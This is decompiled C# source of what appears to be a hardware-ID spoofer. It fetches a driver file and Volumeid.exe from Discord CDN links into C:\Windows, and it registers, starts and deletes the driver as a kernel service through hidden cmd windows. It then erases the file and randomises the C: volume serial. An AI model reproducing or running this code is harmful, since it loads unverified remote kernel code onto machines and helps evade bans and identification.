using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace HardDrive
{
	internal class Diskdrive
	{
		internal static Diskdrive KsnI0jZiWDTNLldYpp9;

		public static void DiskdriveSpoof()
		{
			smethod_0("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
			Thread.Sleep(600);
			smethod_0("sc start Win32x64_0");
			smethod_0("sc stop Win32x64_0");
			smethod_0("sc delete Win32x64_0");
			File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
		}

		public static void DownloadDriver()
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/811988504296554496/zxEsdMeYxazy.dat", "C:\\Windows\\zxEsdMeYxazy.dat");
			webClient.Proxy = null;
		}

		public static void VolumeID()
		{
			if (!File.Exists("C:\\Windows\\Volumeid.exe"))
			{
				Thread.Sleep(700);
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/811988709334712350/Volumeid.exe", "C:\\Windows\\Volumeid.exe");
				webClient.Proxy = null;
				Random random = new Random();
				string text = random.Next(1000, 9999) + "-" + random.Next(1000, 9999);
				Process process = new Process();
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = "cmd.exe";
				process.Start();
				process.StandardInput.WriteLine("cd C:\\Windows");
				process.StandardInput.WriteLine("volumeid C: " + text);
				Thread.Sleep(1500);
				process.Close();
			}
			else
			{
				Random random2 = new Random();
				string text2 = random2.Next(1000, 9999) + "-" + random2.Next(1000, 9999);
				Process process2 = new Process();
				process2.StartInfo.RedirectStandardInput = true;
				process2.StartInfo.UseShellExecute = false;
				process2.StartInfo.CreateNoWindow = true;
				process2.StartInfo.FileName = "cmd.exe";
				process2.Start();
				process2.StandardInput.WriteLine("cd C:\\Windows\\System32\\wbem");
				process2.StandardInput.WriteLine("volumeid C: " + text2);
				Thread.Sleep(1000);
				process2.Close();
			}
		}

		private static void smethod_0(string string_0)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			_ = process.ExitCode;
			process.Close();
		}

		public Diskdrive()
		{
			Class15.smethod_0();
			base._002Ector();
		}

		internal static bool Nlwg85Zru1QYXoTVBmC()
		{
			return KsnI0jZiWDTNLldYpp9 == null;
		}
	}
}
